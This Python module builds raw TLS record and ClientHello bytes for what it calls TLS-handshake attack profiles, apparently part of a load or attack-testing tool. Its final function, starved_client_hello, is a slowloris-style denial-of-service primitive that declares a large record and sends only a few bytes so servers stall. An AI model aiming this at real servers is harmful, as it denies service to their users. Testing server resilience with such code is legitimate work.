"""Minimal, dependency-free TLS record + handshake builders.

This module exists so the Tier-4 TLS-handshake attack profiles can emit *real*
TLS handshake wire bytes with nothing but the standard library. It is a
serializer only - there is no key exchange, no cipher state and no response
parsing - which is exactly what the handshake-starvation profiles need: they pin
a server's handshake reassembly buffer / renegotiation state by over-promising a
record and never completing it, without ever establishing a session. The
companion Rust module is ``rust/src/engine/tls.rs``; the two are kept
byte-for-byte equivalent and share ``tests/mode_list.txt`` as the parity
contract.

A TLS record (RFC 5246 §6.2.1 / the same framing reused for the TLS 1.3
"legacy record version") is::

    +----1----+----2----+----2----+
    |  type   | version | length  |   (length is 16-bit, <= 2**14 plaintext)
    +-----------------------------+
    |            fragment ...     |

A handshake message sits inside one or more handshake records::

    +----1----+----3----+
    |  type   | length  |   (length is 24-bit)
    +---------+---------+
    |         body      |

The profiles deliberately declare a record length far larger than the bytes they
actually deliver; a conforming server sizes its handshake buffer from that length
and blocks waiting for the rest, which never arrives - the TLS-layer analogue of
slowloris.
"""

from __future__ import annotations

# TLS record content types (RFC 5246 §6.2.1; the same octet values carry over
# to TLS 1.3 where the real content type is hidden inside the encrypted record).
CONTENT_CHANGE_CIPHER_SPEC = 0x14
CONTENT_ALERT = 0x15
CONTENT_HANDSHAKE = 0x16
CONTENT_APPLICATION_DATA = 0x17

# Handshake message types (RFC 5246 §7.4).
HS_CLIENT_HELLO = 0x01
HS_SERVER_HELLO = 0x02
HS_CERTIFICATE = 0x0B
HS_SERVER_HELLO_DONE = 0x0E
HS_FINISHED = 0x14

# Record-layer protocol versions. The record layer of TLS 1.2 (and the "legacy"
# record version of TLS 1.3) still uses 0x0301/0x0303 on the wire; 0x0301 is the
# version most servers accept for a ClientHello record header.
SSL31 = 0x0301
TLS12 = 0x0303

# The maximum plaintext record fragment (2**14); a real record layer refuses any
# declared length larger than this, so over-promising stays within it.
MAX_RECORD = 1 << 14

# A handful of well-known cipher suite codes so the ClientHello looks plausible
# (TLS 1.3 suites plus a couple of TLS 1.2 ECDHE-RSA-GCM suites).
_DEFAULT_CIPHER_SUITES = (0x1301, 0x1302, 0x1303, 0xC02F, 0xC030)


def record_header(content_type: int, version: int, declared_len: int) -> bytes:
    """A 5-octet TLS record header that *declares* ``declared_len`` payload bytes.

    ``declared_len`` must fit the 16-bit length field; the starved-record
    profiles pass a value larger than the bytes they ever send.
    """
    if not 0 <= declared_len <= 0xFFFF:
        raise ValueError("record length does not fit the 16-bit field")
    return (
        bytes([content_type & 0xFF])
        + (version & 0xFFFF).to_bytes(2, "big")
        + declared_len.to_bytes(2, "big")
    )


def record(content_type: int, payload: bytes, version: int = SSL31) -> bytes:
    """A complete TLS record: header whose length matches ``payload`` + payload."""
    if len(payload) > 0xFFFF:
        raise ValueError("record payload too large")
    return record_header(content_type, version, len(payload)) + payload


def handshake(hs_type: int, body: bytes) -> bytes:
    """A handshake message header (type + 24-bit length) + ``body``."""
    if len(body) > 0xFFFFFF:
        raise ValueError("handshake body exceeds the 24-bit length field")
    return bytes([hs_type & 0xFF]) + len(body).to_bytes(3, "big") + body


def client_hello_body(
    random_bytes: bytes,
    session_id: bytes = b"",
    cipher_suites: tuple[int, ...] | None = None,
    version: int = TLS12,
) -> bytes:
    """Serialize the body of a plausible TLS 1.2/1.3 ClientHello (no extensions).

    ``random_bytes`` must be exactly 32 octets (the ClientHello ``random``).
    An empty session id and the NULL compression method keep the block tiny and
    deterministic-length; extensions (SNI etc.) are intentionally omitted since
    the profiles never complete the handshake.
    """
    if len(random_bytes) != 32:
        raise ValueError("ClientHello random must be exactly 32 bytes")
    if cipher_suites is None:
        cipher_suites = _DEFAULT_CIPHER_SUITES
    body = bytearray()
    body += (version & 0xFFFF).to_bytes(2, "big")
    body += random_bytes
    body += bytes([len(session_id)]) + session_id
    suite_bytes = b"".join(s.to_bytes(2, "big") for s in cipher_suites)
    body += len(suite_bytes).to_bytes(2, "big") + suite_bytes
    body += bytes([1, 0x00])  # compression: one method, NULL
    return bytes(body)


def client_hello(random_bytes: bytes, session_id: bytes = b"") -> bytes:
    """A complete, internally-consistent ClientHello handshake message."""
    return handshake(HS_CLIENT_HELLO, client_hello_body(random_bytes, session_id))


def starved_client_hello(
    random_bytes: bytes,
    declared_record_len: int = MAX_RECORD,
    header_body_bytes: int = 8,
) -> bytes:
    """The opening bytes of a ClientHello that under-delivers its record length.

    Emits a handshake *record* header declaring ``declared_record_len`` payload
    bytes and a ClientHello handshake header declaring ``declared_record_len -
    4`` message bytes, followed by only ``header_body_bytes`` real body octets.
    The declared lengths are consistent with each other but far larger than what
    is sent, so a server that reads the record header blocks waiting for the rest
    of a ``declared_record_len``-byte handshake record that never fully arrives.
    """
    msg_len = declared_record_len - 4  # the 4-octet handshake message header
    body = client_hello_body(random_bytes)
    start = body[:header_body_bytes]
    return (
        record_header(CONTENT_HANDSHAKE, SSL31, declared_record_len)
        + bytes([HS_CLIENT_HELLO])
        + msg_len.to_bytes(3, "big")
        + start
    )
